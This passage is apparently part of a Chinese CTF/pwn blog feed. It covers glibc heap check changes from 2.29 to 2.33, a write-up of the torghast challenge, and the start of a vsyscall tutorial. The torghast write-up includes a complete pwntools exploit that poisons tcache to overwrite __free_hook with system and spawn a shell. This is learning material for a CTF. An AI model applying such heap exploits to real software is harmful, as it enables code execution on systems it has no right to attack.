3&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查链表尾是否完整</p><h3 id="从topchunk切割时增加检查"><a href="#从topchunk切割时增加检查" class="headerlink" title="从topchunk切割时增加检查"></a>从topchunk切割时增加检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>检查topchunk的size是否合规</p><h2 id="free检查变化-1"><a href="#free检查变化-1" class="headerlink" title="free检查变化"></a>free检查变化</h2><h3 id="tcache新增double-free检查"><a href="#tcache新增double-free检查" class="headerlink" title="tcache新增double free检查"></a>tcache新增double free检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">     <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">   <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">      few cycles, but don&#x27;t abort.  */</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>循环检查该链中的所有chunk是否与victim相等,判断double free</p><h3 id="向低地址合并检查size-unlink前检查"><a href="#向低地址合并检查size-unlink前检查" class="headerlink" title="向低地址合并检查size(unlink前检查)"></a>向低地址合并检查size(unlink前检查)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前向低地址合并都是不检查:</p><p>即将unlink的chunk的size是否等于找到这个chunk的prev_size</p><p>现在新增了这个检查,使得unlink的利用受到多一点的限制</p><p>向高地址合并则没有变化</p><h3 id="malloc-consolidate新增一处检查"><a href="#malloc-consolidate新增一处检查" class="headerlink" title="malloc_consolidate新增一处检查"></a>malloc_consolidate新增一处检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与向低地址合并检查size相同,只不过由malloc_consolidate触发</p><h2 id="tcache机制变化"><a href="#tcache机制变化" class="headerlink" title="tcache机制变化"></a>tcache机制变化</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>可以看到每个节点多了一个字段*key(对应chunk的bk字段)</p><p>在tcahce_put中e-&gt;key = tcache;</p><p>在tcache_get中e-&gt;key = NULL;</p><p>但用处还不知道</p><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h2 id="malloc检查变化-1"><a href="#malloc检查变化-1" class="headerlink" title="malloc检查变化"></a>malloc检查变化</h2><h3 id="从unsortedbin取出放入largebin新增检测"><a href="#从unsortedbin取出放入largebin新增检测" class="headerlink" title="从unsortedbin取出放入largebin新增检测"></a>从unsortedbin取出放入largebin新增检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">     malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>分别检测fd_nextsize/bk_nextsize链和fd/bk链是否完整</p><h2 id="free检查变化-2"><a href="#free检查变化-2" class="headerlink" title="free检查变化"></a>free检查变化</h2><p>貌似没什么变化</p><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><h2 id="malloc检查变化-2"><a href="#malloc检查变化-2" class="headerlink" title="malloc检查变化"></a>malloc检查变化</h2><h3 id="tcache-get新增对齐检测"><a href="#tcache-get新增对齐检测" class="headerlink" title="tcache_get新增对齐检测"></a>tcache_get新增对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>检测对齐</p><h3 id="tcache-thread-shutdown增加对齐检测"><a href="#tcache-thread-shutdown增加对齐检测" class="headerlink" title="tcache_thread_shutdown增加对齐检测"></a>tcache_thread_shutdown增加对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>同上</p><h3 id="REMOVE-FB检测发生较多变化"><a href="#REMOVE-FB检测发生较多变化" class="headerlink" title="REMOVE_FB检测发生较多变化"></a>REMOVE_FB检测发生较多变化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>暂时未知,应该是检测对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br></pre></td></tr></table></figure><p>暂时未知,应该是检测对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>暂时未知,应该是检测对齐</p><h2 id="free检查变化-3"><a href="#free检查变化-3" class="headerlink" title="free检查变化"></a>free检查变化</h2><h3 id="free-tcache新增对齐检测"><a href="#free-tcache新增对齐检测" class="headerlink" title="free-tcache新增对齐检测"></a>free-tcache新增对齐检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="tcache新增触发提示"><a href="#tcache新增触发提示" class="headerlink" title="tcache新增触发提示"></a>tcache新增触发提示</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>)</span><br></pre></td></tr></table></figure><p>之前就有检测,但没有用malloc_printerr触发</p><h2 id="tcache加密"><a href="#tcache加密" class="headerlink" title="tcache加密!"></a>tcache加密!</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>新增了这两个宏用于加密</p><p><strong>这个加密是半可逆的,可以恢复ptr的值，但无法完全恢复原始的pos的值。</strong></p><p>在tcache_put中进行加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到第一个chunk是没有加密的</p>]]></content>
    
    
    <summary type="html">glibc各个版本检查机制发生的变化</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="安全检查" scheme="https://ixout.github.io/tags/%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5/"/>
    
    <category term="glibc" scheme="https://ixout.github.io/tags/glibc/"/>
    
  </entry>
  
  <entry>
    <title>SunmerWeek3</title>
    <link href="https://ixout.github.io/posts/17172/"/>
    <id>https://ixout.github.io/posts/17172/</id>
    <published>2023-07-29T07:40:02.000Z</published>
    <updated>2023-08-01T12:11:20.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="任务Ⅰ"><a href="#任务Ⅰ" class="headerlink" title="任务Ⅰ"></a>任务Ⅰ</h1><h2 id="2022ciscn-syscall"><a href="#2022ciscn-syscall" class="headerlink" title="2022ciscn-syscall"></a>2022ciscn-syscall</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>看不懂程序在干什么👶</p><h2 id="2022mrctf-ezbash"><a href="#2022mrctf-ezbash" class="headerlink" title="2022mrctf-ezbash"></a>2022mrctf-ezbash</h2><h2 id="2022春秋杯-torghast"><a href="#2022春秋杯-torghast" class="headerlink" title="2022春秋杯-torghast"></a>2022春秋杯-torghast</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序要进行攻击的话,首先得成功通关关卡</p><p>需要通关有需要先取得GM权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)mp5070[<span class="number">6</span> * dword_504C] &gt; <span class="number">0x5F5E0FE</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     dword_5058 = <span class="number">1</span>;</span><br><span class="line">     LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Welcome GAME MASTER&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到再进行比较的时候事先将mp转为无符号了</p><p>而在购买其他物品时,只比较了金钱是否大于0,而没有比较是否大于价格</p><p><strong>取得权限:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>程序在edit_player的时候会存在off-by-null漏洞</p><p><strong>exp:</strong>不知道是不是一开始的交互函数没写好,导致程序交互总是莫名其妙的卡住,五六次使用脚本只有一次符合预期,调试的时候可以说是极其折磨了,折腾了一天</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Size\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Data\n&#x27;</span>,(content))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Change?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Your Log:&#x27;</span>,content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;User?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">game()</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)<span class="comment">#prevent consolidate betwwen two chunk</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)<span class="comment">#prevent merge with topchunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">3</span>)</span><br><span class="line">libc_address=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">1</span>)</span><br><span class="line">heap_3=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=libc_address-<span class="number">96</span>-<span class="number">0x1ebb80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_3))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">heap_5=heap_3+<span class="number">0x840</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_5))</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(heap_3-<span class="number">0x8</span>)+p64(heap_3)+p64(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x110</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x110</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x110</span>,p64(system))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">SunmerWeek3</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="SunmerCamp2023" scheme="https://ixout.github.io/tags/SunmerCamp2023/"/>
    
  </entry>
  
  <entry>
    <title>vsyscall初识</title>
    <link href="https://ixout.github.io/posts/7020/"/>
    <id>https://ixout.github.io/posts/7020/</id>
    <published>2023-07-25T13:13:02.000Z</published>
    <updated>2023-07-30T11:42:59.510Z</updated>
    
    <content type="html"><![CDATA[<p><strong>vsyscall</strong></p><p>gdb运行程序的时候会发现无论是否开启pie和aslr,内存<code>ffffffffff600000-ffffffffff601000</code>处一定是属于<code>vsyscall</code></p><p>将这块内存<code>dump memory ./dump ffffffffff600000 ffffffffff601000</code>dump下来查看,可以发现</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/13348817-23d78409dea3408f.webp" alt=""></p><p>内部是三个系统调用并跟随着retn</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>vsyscall的利用其实就是在程序地址随机化的情况下,通过在栈上寻找仅有部分比特位与我们需要的返回地址不同的地址信息,通过溢出部分写修改该地址,然后将vsyscall视为一个已知地址的gadget使返回地址一步步移动到所修改处</p><p>其实还是栈溢出的简单利用</p><p>把vsyscall视为一个固定地址的ret-gadget</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="magic-number"><a href="#magic-number" class="headerlink" title="magic_number"></a>magic_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_9A0(a1, a2, a3);</span><br><span class="line">  v5 = rand();</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">305419896</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your Input :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span 